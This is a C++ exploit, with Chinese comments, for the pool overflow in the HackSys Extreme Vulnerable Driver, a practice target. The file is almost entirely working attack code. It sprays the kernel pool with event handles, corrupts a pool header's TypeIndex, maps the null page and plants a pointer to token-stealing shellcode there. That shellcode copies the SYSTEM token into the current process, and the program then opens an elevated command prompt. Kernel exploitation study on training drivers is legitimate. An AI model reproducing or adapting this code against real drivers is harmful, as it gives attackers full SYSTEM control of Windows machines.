// HEVD_POOL_OVERFLOW.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

void shellcode()
{
	_asm
	{
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
		mov eax, [eax + 0x50]   // 找到_EPROCESS结构
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// 循环是为了获取system的_EPROCESS
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// 找到进程活动链表
					 sub eax, 0xb8    		// 链表遍历
					 cmp[eax + 0xb4], edx    // 根据PID判断是否为SYSTEM
					 jnz find_sys_pid

					 // 替换Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 ret 
	}
}


int main()
{
	HANDLE hDevice = NULL;
	DWORD recv = NULL;
	PNtAllocateVirtualMemory NtAllocateVirtualMemory;
	char buffer[0x220];
	HANDLE EventList[0x1000] = { 0 };

	hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}
	
	memset(buffer, 0x41, 0x220);

	//池喷射
	for (int i = 0; i < 0x1000; i++)
	{
		EventList[i] = CreateEventA(NULL, FALSE, FALSE, NULL);
	}

	for (int i = 0; i < 1000; i++)
	{
		for (int x = 0; x < 8; x++)
		{
			CloseHandle(EventList[i + x]);
		}
		i += 8;
	}

	//溢出池的头部
	*(DWORD *)(buffer + 0x1f8 + 0x0) = 0x04080040;
	*(DWORD *)(buffer + 0x1f8 + 0x4) = 0xee657645;
	*(DWORD *)(buffer + 0x1f8 + 0x8) = 0x00000000;
	*(DWORD *)(buffer + 0x1f8 + 0xC) = 0x00000040;
	*(DWORD *)(buffer + 0x1f8 + 0x10) = 0x00000000;
	*(DWORD *)(buffer + 0x1f8 + 0x14) = 0x00000000;
	*(DWORD *)(buffer + 0x1f8 + 0x18) = 0x00000001;
	*(DWORD *)(buffer + 0x1f8 + 0x1c) = 0x00000001;
	*(DWORD *)(buffer + 0x1f8 + 0x20) = 0x00000000;
	*(DWORD *)(buffer + 0x1f8 + 0x24) = 0x00080000; //将 TypeIndex 改为0
	
	NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(
				GetModuleHandle(L"ntdll.dll"),
				"NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		wprintf(L"[!] Failed to Resolve NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return -1;
	}

	PVOID BaseAddress = (PVOID)0x1;
	SIZE_T RegionSize = 1024;

	// 分配0页内存
	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(),
		&BaseAddress,
		0,
		&RegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE
	);


	//将0页内存的 CloseProcedure 处修改为shellcode地址。
	*(DWORD*)(0x60) = (DWORD)&shellcode;

	//利用
	DeviceIoControl(hDevice, 0x22200f, buffer, 0x220, NULL, NULL, &recv, NULL);

	//释放池
	for (int i = 0; i < 0x1000; i++)
	{
		if (EventList[i])
		{
			CloseHandle(EventList[i]);
		}
	}

	system("start cmd.exe");
	CloseHandle(hDevice);
	return 0;
}
